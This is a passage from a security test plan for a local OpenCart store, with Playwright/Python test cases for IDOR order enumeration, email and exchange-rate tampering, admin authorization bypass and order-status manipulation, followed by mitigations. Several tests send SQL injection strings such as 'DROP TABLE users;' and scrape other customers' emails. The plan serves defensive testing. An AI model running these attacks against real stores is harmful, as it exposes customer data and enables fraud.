    # Check if we have orders created without payment
    if "pending payment" in await page.content():
        logger.warning("Orders exist with 'pending payment' status")
        return True
    
    # Method 3: Use route interception to simulate missing session data
    # Check if the server validates payment_method exists in session
    session_data = {}
    
    async def intercept_confirm(route):
        request = route.request
        
        if "confirm" in request.url:
            # Simulate incomplete session by removing payment_method
            session_data['payment_method'] = None
            
            # The server should reject this, but if it doesn't...
        
        await route.continue_()
    
    await page.route("**/*", intercept_confirm)
    
    # Try to confirm without payment in session
    await page.goto(
        "http://localhost/opencart_test/upload/index.php?"
        "route=checkout/confirm"
    )
    
    # If page loads without error, state transition is possible
    if "error" not in await page.content().lower():
        logger.error("🔴 Confirm loads without payment validation")
        return True
    
    # Method 4: Direct API call to place order without payment_method field
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=checkout/confirm",
        form_data={
            # Intentionally omit payment_method
            "payment_address_id": "1",
            "shipping_method": "flat.flat"
            # NO payment_method!
        }
    )
    
    if "order placed" in await response.text():
        logger.error("🔴 Order placed without payment_method in POST data!")
        return True
    
    return False
```

---

### **TEST CASE 15: UC_15 - IDOR: ACCESSING OTHER CUSTOMERS' ORDERS**

**Use Case Name:** Xem lịch sử đơn hàng (Order History)  
**Severity:** EXTREME  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec says: *"Xác thực đơn hàng thuộc khách hàng hiện tại"* but this verification might be:
- Done on frontend only (bypass with Devtools)
- Not properly implemented on backend
- Checking insufficient parameters

An attacker can enumerate order IDs to view other customers' orders:
```
/account/order/orderId=1
/account/order/orderId=2
/account/order/orderId=3
```

#### **Playwright Execution Strategy:**

```python
async def test_uc15_idor_order_history():
    """Test IDOR to access other customers' orders"""
    
    # Method 1: Enumerate order IDs
    intercepted_orders = {}
    
    for order_id in range(1, 500):
        response = await page.request.get(
            f"http://localhost/opencart_test/upload/index.php?"
            f"route=account/order/info&order_id={order_id}"
        )
        
        if response.status == 200:
            content = await response.text()
            
            # Extract customer name, email from response
            import re
            email_match = re.search(r'Email[:\s]+([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', content)
            if email_match:
                email = email_match.group(1)
                
                # If email is different from current user, it's IDOR
                if email != "shin@test.com":  # Assuming current user
                    logger.error(f"🔴 IDOR CONFIRMED: Order {order_id} from {email} accessible!")
                    intercepted_orders[order_id] = email
    
    if intercepted_orders:
        logger.error(f"🔴 Can access {len(intercepted_orders)} other customers' orders")
        for oid, email in list(intercepted_orders.items())[:3]:
            logger.error(f"   Order {oid}: {email}")
        return True
    
    # Method 2: Try to view order of different customer via API
    response = await page.request.get(
        "http://localhost/opencart_test/upload/api/order/1"
    )
    
    if response.status == 200:
        data = response.json()
        if 'customer_email' in data:
            logger.warning(f"API returned order data: {data}")
            # Verify it's someone else's order
            if data['customer_email'] != "shin@test.com":
                logger.error("🔴 IDOR via API confirmed")
                return True
    
    # Method 3: Try to modify order_id in session
    # Sometimes backend only checks session order_id, not URL parameter
    await page.goto(
        "http://localhost/opencart_test/upload/index.php?"
        "route=account/order/info&order_id=999"
    )
    
    content = await page.content()
    
    # If we see order details instead of "Order not found"
    if "Product" in content and "Total" in content and "Date" in content:
        logger.error("🔴 Can view order 999 without authorization check")
        return True
    
    # Method 4: Check if order details are in HTML/JavaScript
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=account/order")
    
    await page.wait_for_load_state('networkidle')
    
    # Check if source code exposes order_id's
    page_source = await page.content()
    
    import re
    exposed_order_ids = re.findall(r'order[_-]?id["\']?\s*:\s*["\']?(\d+)', page_source)
    logger.info(f"Exposed order IDs in page source: {exposed_order_ids}")
    
    # For each exposed ID, try to access
    for order_id in exposed_order_ids[:5]:
        response = await page.request.get(
            f"http://localhost/opencart_test/upload/index.php?"
            f"route=account/order/info&order_id={order_id}"
        )
        
        if response.status == 200:
            # Verify content
            if "Customer" in await response.text():
                logger.warning(f"Order {order_id} content exposed")
    
    return False
```

---

### **TEST CASE 16: UC_16 - PARAMETER TAMPERING: MODIFY EMAIL TO ANOTHER USER**

**Use Case Name:** Cập nhật thông tin cá nhân (Update Profile)  
**Severity:** EXTREME  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec says: *"Email không hợp lệ → thông báo lỗi"* and *"Email đã tồn tại → thông báo lỗi"*

But what if the system doesn't check if email is OWNED by the current user before flagging as duplicate? An attacker can:
- Register fake account
- Try to change email to someone else's real email
- If only "email exists" check, attacker might bypass uniqueness
- Takeover accounts by changing other users' emails to invalid ones

#### **Playwright Execution Strategy:**

```python
async def test_uc16_email_takeover():
    """Test changing email to another user's email"""
    
    # Step 1: Get list of valid emails in system
    valid_emails = [
        "shin@test.com",
        "admin@test.com",
        "customer2@test.com"
    ]
    
    # Step 2: Try to change our email to someone else's
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?"
        "route=account/edit",
        form_data={
            "firstname": "Attacker",
            "lastname": "Hacker",
            "email": "shin@test.com",  # Try to "steal" this email
            "telephone": "1234567890"
        }
    )
    
    resp_text = await response.text()
    
    # Check different error responses
    if "already registered" in resp_text or "already in use" in resp_text:
        logger.info("System returned 'email exists' error (expected)")
    elif response.status == 200:
        logger.error("🔴 Email change to existing email ACCEPTED!")
        return True
    
    # Step 3: Check if we can now login with that email
    # If so, we've hijacked the account
    
    # Step 4: Try to change to email with same domain
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=account/edit",
        form_data={
            "email": "shin+hacked@test.com"  # Variation of existing email
        }
    )
    
    if response.status == 200 and "error" not in resp_text:
        logger.warning("Email variation accepted")
    
    # Step 5: Try to change email to non-existent but similar
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=account/edit",
        form_data={
            "email": "SHIN@test.com"  # Case variation - should fail if case-insensitive checking
        }
    )
    
    # Try case-sensitive bypass
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=account/edit",
        form_data={
            "email": "Shin@TEST.COM"  # Different case
        }
    )
    
    # Step 6: Direct SQLi attempt in email field to alter other user
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=account/edit",
        form_data={
            "email": "attacker@test.com' WHERE customer_id=1--"  # SQL injection
        }
    )
    
    return False
```

---

### **TEST CASE 17: UC_17 - AUTHORIZATION BYPASS: CUSTOMER ACCESSING ADMIN PANEL**

**Use Case Name:** Quản lý sản phẩm (Product Management - Admin)  
**Severity:** EXTREME  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec says: *"Admin đã đăng nhập vào trang quản trị. Có quyền truy cập module Catalog"*

But this authorization might only be checked:
- On the frontend (disabled buttons, hidden menus)
- In the controller, not in every action
- Via role checking that's incomplete

A customer logged in can potentially:
```
GET /admin/controller/catalog/product
POST /admin/index.php?route=catalog/product/add
```

And if authorization is only decorative, actions execute!

#### **Playwright Execution Strategy:**

```python
async def test_uc17_admin_authorization_bypass():
    """Test unauthorized access to admin product management"""
    
    # Step 1: Login as regular customer (not admin)
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=account/login")
    
    await page.fill('input[name="email"]', "shin@test.com")
    await page.fill('input[name="password"]', "123456")
    await page.click('button[type="submit"]')
    await page.wait_for_load_state('networkidle')
    
    # Confirm we're logged in as customer
    content = await page.content()
    assert "My Account" in content, "Not logged in as customer"
    
    # Step 2: Try to access admin panel directly
    admin_urls = [
        "/admin/index.php",
        "/admin/",
        "/administrator/",
        "/admin/controller/catalog/product"
    ]
    
    for url in admin_urls:
        full_url = f"http://localhost/opencart_test/upload{url}"
        
        response = await page.request.get(full_url)
        
        if response.status == 200:
            resp_text = await response.text()
            
            if "Dashboard" in resp_text or "System" in resp_text or "Products" in resp_text:
                logger.error(f"🔴 AUTHORIZATION BYPASS: Can access admin at {url}")
                return True
    
    # Step 3: Try direct API calls to add product
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=catalog/product/add",
        form_data={
            "name[0]": "Hacked Product",
            "Price": "999",
            "status": "1"
        }
    )
    
    if response.status == 200 and "error" not in await response.text():
        logger.error("🔴 Product creation API accessible without admin role!")
        return True
    
    # Step 4: Try to modify existing product
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=catalog/product/edit&product_id=1",
        form_data={
            "price": "0.01"  # Change price to 1 cent
        }
    )
    
    if response.status == 200:
        logger.error("🔴 Can modify products without admin authorization!")
        return True
    
    # Step 5: Try to access admin session token
    await page.evaluate("""
        // Check if admin token is accessible
        console.log('Auth Token:', localStorage.getItem('admin_token'));
        console.log('All localStorage:', Object.keys(localStorage));
    """)
    
    return False
```

---

### **TEST CASE 18: UC_18 - AUTHORIZATION BYPASS: CUSTOMER MODIFYING ORDER STATUS**

**Use Case Name:** Quản lý đơn hàng (Order Management - Admin)  
**Severity:** EXTREME  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec says: *"Cập nhật trạng thái đơn hàng"* is an ADMIN function.

A customer could:
- Change their own order from "Pending" to "Complete" (claim they paid)
- Change to "Shipped" before it's actually shipped
- Bypass payment verification

If the system doesn't VERIFY the role before executing status change:

#### **Playwright Execution Strategy:**

```python
async def test_uc18_order_status_manipulation():
    """Test customer modifying order status"""
    
    # Step 1: Place an order first
    # ...create order process...
    
    # Step 2: Try to access order management as customer
    response = await page.request.get(
        "http://localhost/opencart_test/upload/index.php?route=sale/order"
    )
    
    if response.status == 200 and "Orders" in await response.text():
        logger.error("🔴 Customer can access order management panel!")
        return True
    
    # Step 3: Try to change order status via API
    # Find a customer's order ID (usually visible in My Account)
    
    await page.goto(
        "http://localhost/opencart_test/upload/index.php?route=account/order"
    )
    
    # Extract order ID
    import re
    content = await page.content()
    order_match = re.search(r'Order ID[:\s]+#?(\d+)', content)
    
    if order_match:
        order_id = order_match.group(1)
        
        # Try to update status
        response = await page.request.post(
            f"http://localhost/opencart_test/upload/index.php?"
            f"route=sale/order/edit&order_id={order_id}",
            form_data={
                "order_status_id": "5",  # Complete status
                "notify": "0"
            }
        )
        
        if response.status == 200:
            logger.error(f"🔴 Can update order {order_id} status without admin role!")
            return True
    
    # Step 4: Try to add order history/comment as customer
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=sale/order/history",
        form_data={
            "order_id": "1",
            "order_status_id": "5",
            "comment": "Order has been completed and shipped!"
        }
    )
    
    if response.status == 200:
        logger.error("🔴 Can modify order history as customer!")
        return True
    
    return False
```

---

### **TEST CASE 19: UC_19 - PARAMETER TAMPERING: EXCHANGE RATE MANIPULATION**

**Use Case Name:** Cấu hình tiền tệ & Tỷ giá (Currency Management)  
**Severity:** HARD  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec says: *"Tỷ giá quy đổi... Tỷ giá > 0"*

But what if an attacker (customer or even admin) can:
- Set exchange rate to 0: Price becomes $0
- Set to negative: Gets discount instead of paying
- Set to 0.00001: Massive underpricing

#### **Playwright Execution Strategy:**

```python
async def test_uc19_exchange_rate_manipulation():
    """Test exchange rate tampering"""
    
    # Admin needs to be logged in for this, so let's try both approaches
    
    # Method 1: Direct API attack if available
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?"
        "route=localisation/currency/edit&currency_id=1",
        form_data={
            "value": "0"  # Set exchange rate to zero!
        }
    )
    
    if response.status == 200:
        logger.error("🔴 Exchange rate set to 0 accepted!")
        return True
    
    # Method 2: Negative exchange rate
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?"
        "route=localisation/currency/edit&currency_id=1",
        form_data={
            "value": "-1.5"  # Negative exchange rate!
        }
    )
    
    if response.status == 200 and "error" not in await response.text():
        logger.error("🔴 NEGATIVE exchange rate accepted!")
        return True
    
    # Method 3: Very small decimal (rounds to zero)
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?"
        "route=localisation/currency/edit&currency_id=1",
        form_data={
            "value": "0.000001"  # Nearly zero
        }
    )
    
    if response.status == 200:
        logger.warning("Very small exchange rate accepted")
    
    # Method 4: Non-numeric value
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?"
        "route=localisation/currency/edit&currency_id=1",
        form_data={
            "value": "DROP TABLE users;"  # SQL injection time!
        }
    )
    
    if response.status in [200, 500]:  # Either accepts or crashes
        logger.error("🔴 Non-numeric exchange rate processed!")
        return True
    
    return False
```

---

### **TEST CASE 20: UC_20 - IDOR: ASSIGNING SELF TO HIGH-DISCOUNT CUSTOMER GROUP**

**Use Case Name:** Quản lý nhóm khách hàng (Customer Groups)  
**Severity:** EXTREME  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec says: *"Nhóm mới có thể được gán cho khách hàng"* 

But who performs this assignment? Is it:
- Only admin in backend? (Should be)
- Or can a customer modify their own group? (Insecure!)

An attacker can:
```php
// If API is exposed:
POST /api/customer/1/group
{
  "customer_group_id": 5  // VIP group with 50% discount!
}
```

#### **Playwright Execution Strategy:**

```python
async def test_uc20_customer_group_escalation():
    """Test IDOR to assign self to higher-discount customer group"""
    
    # Step 1: Login as regular customer
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=account/login")
    
    await page.fill('input[name="email"]', "shin@test.com")
    await page.fill('input[name="password"]', "123456")
    await page.click('button[type="submit"]')
    
    # Get customer ID from session/profile
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=account/account")
    
    content = await page.content()
    import re
    customer_id_match = re.search(r'customer[_-]?id["\']?\s*:\s*["\']?(\d+)', content)
    
    customer_id = customer_id_match.group(1) if customer_id_match else "1"
    
    # Step 2: Try to change customer group via API
    
    # Method 1: Direct PUT/POST to customer group endpoint
    response = await page.request.post(
        f"http://localhost/opencart_test/upload/api/customer/{customer_id}/group",
        form_data={"group_id": "2"}  # VIP group
    )
    
    if response.status == 200:
        logger.error(f"🔴 Customer can change own group via API!")
        return True
    
    # Method 2: Try through account edit form
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?"
        "route=account/edit",
        form_data={
            "customer_group_id": "2",  # Try to set higher group
            "firstname": "John",
            "lastname": "Doe"
        }
    )
    
    if response.status == 200 and "error" not in await response.text():
        logger.error("🔴 Customer group field accepted in profile edit!")
        
        # Verify the change worked
        await page.goto("http://localhost/opencart_test/upload/index.php?"
                       "route=account/account")
        
        new_content = await page.content()
        if "Premium" in new_content or "VIP" in new_content:
            logger.error("🔴 Customer successfully upgraded own group!")
            return True
    
    # Step 3: Test price change after group assignment
    # If customer got higher discount group, product prices should decrease
    
    before_prices = {}
    await page.goto("http://localhost/opencart_test/upload/")
    
    # Capture prices before
    prices_before = await page.evaluate("""
        Array.from(document.querySelectorAll('.price')).map(el => parseFloat(el.textContent.replace('$', '')))
    """)
    
    # Now assign to discount group (if we can)
    # Check prices after
    # If they decreased, we successfully escalated to discount group!
    
    return False
```

---

## 📊 VULNERABILITY SUMMARY TABLE

| # | UC ID | Vulnerability Type | Severity | Difficulty |
|---|-------|-------------------|----------|-----------|
| 1 | UC_01 | Database Overflow | EXTREME | Hard |
| 2 | UC_02 | SQL Injection (Auth) | EXTREME | Extreme |
| 3 | UC_03 | Session Fixation | HARD | Hard |
| 4 | UC_04 | IDOR (Disabled Products) | HARD | Hard |
| 5 | UC_05 | SQL Injection (Search) | EXTREME | Hard |
| 6 | UC_06 | Parameter Tampering (Negative Price) | HARD | Hard |
| 7 | UC_07 | IDOR (Draft Products) | HARD | Hard |
| 8 | UC_08 | Parameter Tampering (Negative Qty) | HARD | Hard |
| 9 | UC_09 | Race Condition (Cart) | HARD | Hard |
| 10 | UC_10 | Parameter Tampering (Qty Exceed) | HARD | Hard |
| 11 | UC_11 | IDOR (Shipping Addresses) | EXTREME | Hard |
| 12 | UC_12 | Parameter Tampering (Shipping Cost) | EXTREME | Hard |
| 13 | UC_13 | Race Condition (Coupon) | HARD | Hard |
| 14 | UC_14 | State Transition Attack | EXTREME | Extreme |
| 15 | UC_15 | IDOR (Order History) | EXTREME | Hard |
| 16 | UC_16 | Parameter Tampering (Email) | EXTREME | Hard |
| 17 | UC_17 | Authorization Bypass (Admin) | EXTREME | Hard |
| 18 | UC_18 | Authorization Bypass (Order Mgmt) | EXTREME | Hard |
| 19 | UC_19 | Parameter Tampering (Exchange Rate) | HARD | Hard |
| 20 | UC_20 | IDOR (Customer Group) | EXTREME | Hard |

---

## 🎯 EXPLOITATION PRIORITY

**Critical (MUST FIX IMMEDIATELY):**
- UC_02: SQL Injection in Login → Full authentication bypass
- UC_14: State Transition → Orders without payment
- UC_15: IDOR Orders → Access to all customer orders

**High Priority (FIX ASAP):**
- UC_01: Database Overflow → DoS/Corruption
- UC_05: SQL Injection in Search → Data exfiltration
- UC_11, UC_12, UC_17, UC_18, UC_16, UC_20: Authorization/IDOR → Customer data exposure

---

## 🛡️ MITIGATION STRATEGIES

### For Each Category:

**1. Input Validation:**
- Maximum length limits (firstname max 32 chars)
- Whitelist acceptable values
- Type validation (numbers only for quantities)
- Range validation (no negative values for prices/quantities)

**2. Parameterized Queries:**
- Use prepared statements for ALL database queries
- Never concatenate user input into SQL
- Use ORM if available (Doctrine, Propel)

**3. Authorization:**
- Check role/permission on EVERY action
- Don't rely on hidden elements/UI
- Validate in backend, not frontend
- Implement proper RBAC (Role-Based Access Control)

**4. IDOR Prevention:**
- Verify resource belongs to current user
- Use encrypted/hashed IDs instead of sequential
- Implement access control lists

**5. Race Conditions:**
- Use database transactions with locks
- Implement optimistic locking
- Validate state before action

**6. Secure Coding:**
- Input sanitization
- Output encoding
- CSRF tokens
- Content Security Policy headers

---

## 📝 CONCLUSION

These 20 critical vulnerabilities represent realistic attack scenarios that could lead to:
- **Financial Loss:** Through pricing manipulations
- **Data Breach:** Via IDOR and SQL injection
- **System Compromise:** Through authorization bypass
- **Fraud:** Via state transition attacks

All 20 test cases should be integrated into your automated testing suite and executed regularly.

---

**Generated:** May 15, 2026  
**Status:** Ready for Security Testing  
**Framework:** Playwright + Python  
**Compliance:** OWASP Top 10 Testing Guide

